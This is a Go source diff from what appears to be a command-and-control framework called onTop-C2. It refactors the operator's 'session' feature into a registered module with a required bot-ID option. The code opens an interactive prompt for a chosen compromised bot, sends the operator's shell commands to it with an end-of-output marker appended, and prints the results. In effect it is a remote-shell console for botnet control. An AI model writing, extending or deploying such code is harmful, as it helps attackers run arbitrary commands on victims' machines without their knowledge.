@@ -1,23 +1,57 @@
-package session
+package modules
 
 import (
 	"bufio"
 	"fmt"
 	"os"
-	"strings"
-	"time"
 	"os/signal"
+	"strings"
 	"syscall"
+	"time"
 
-	"github.com/Yyax13/onTop-C2/src/listener"
 	"github.com/Yyax13/onTop-C2/src/misc"
+	"github.com/Yyax13/onTop-C2/src/types"
 )
 
-func InteractWithSession(sessionID string, SigintChan chan struct{}) {
-	var session *listener.ListenerSession
+var session types.Module = types.Module{
+	Name: "session",
+	Description: "Interact with a session (bot)",
+	Options: sessionOptions,
+	Execute: InteractWithSession,
+
+}
+
+var sessionOptions map[string]*types.Option = map[string]*types.Option{
+	"BOT": {
+		Name: "BOT",
+		Description: "The target bot-id to handle interaction",
+		Required: true,
+		Value: nil,
+
+	},
+
+}
+
+var interruptChannel chan struct{}
+func InteractWithSession(options map[string]*types.Option, _ ...any) {
+	idOption, ok := options["BOT"]
+	if !ok {
+		misc.PanicWarn(fmt.Sprintf("The option %s is unset\n", "BOT"), true)
+		return
+
+	}
+
+	sessionID, ok := idOption.Value.(string)
+	if !ok {
+		misc.PanicWarn(fmt.Sprintf("The %v value isn't valid, must be a valid sessionID str (bot-00000)\n", idOption.Name), true)
+		return		
+
+	}
+
+	var session *ListenerSession
 	var exists bool
 
-	session, exists = listener.Sessions[sessionID]
+	session, exists = Sessions[sessionID]
 
 	if !exists {
 		misc.PanicWarn(fmt.Sprintf("Error: %v %s\n", "Not found session with id", sessionID), true)
@@ -35,14 +69,16 @@ func InteractWithSession(sessionID string, SigintChan chan struct{}) {
 	botIP, _ := misc.Colors(session.BotIP, "white")
 	promptSignal, _ := misc.Colors("->", "white")
 	endFromListener := "___END__OF__RESULT__IN__" + session.ID + "__" + session.BotIP + "___"
+	signal.Stop(misc.InterruptSigs)
+	signal.Notify(misc.ChanInterruptSigs, syscall.SIGINT)
 
 	misc.PrintBanner()
-	misc.ChanInterruptHandler(SigintChan)
+	misc.ChanInterruptHandler(interruptChannel)
 	stdinScanner := bufio.NewScanner(os.Stdin)
 
 	for {
 		select{
-		case <- SigintChan:
+		case <- interruptChannel:
 			signal.Stop(misc.ChanInterruptSigs)
 			signal.Notify(misc.InterruptSigs, syscall.SIGINT)
 			return
@@ -50,7 +86,7 @@ func InteractWithSession(sessionID string, SigintChan chan struct{}) {
 		default:
 			fmt.Printf("%v %v ", botIP, promptSignal)
 			ok := stdinScanner.Scan()
-			misc.ChanCtrlDHandler(ok, stdinScanner.Err(), SigintChan)
+			misc.ChanCtrlDHandler(ok, stdinScanner.Err(), interruptChannel)
 
 			userCommand := strings.TrimSpace(stdinScanner.Text())
 			if userCommand == "" {
@@ -58,7 +94,7 @@ func InteractWithSession(sessionID string, SigintChan chan struct{}) {
 
 			}
 
-			session.Commands <- userCommand + fmt.Sprintf("; echo %v", endFromListener)
+			session.Commands <- userCommand + fmt.Sprintf("; echo; echo %v", endFromListener)
 
 			var fullResponse []string
 			var finishedPrinting bool
@@ -94,4 +130,9 @@ func InteractWithSession(sessionID string, SigintChan chan struct{}) {
 
 	}
 
+}
+
+func init() {
+	RegisterNewModule(&session)
+	
 }
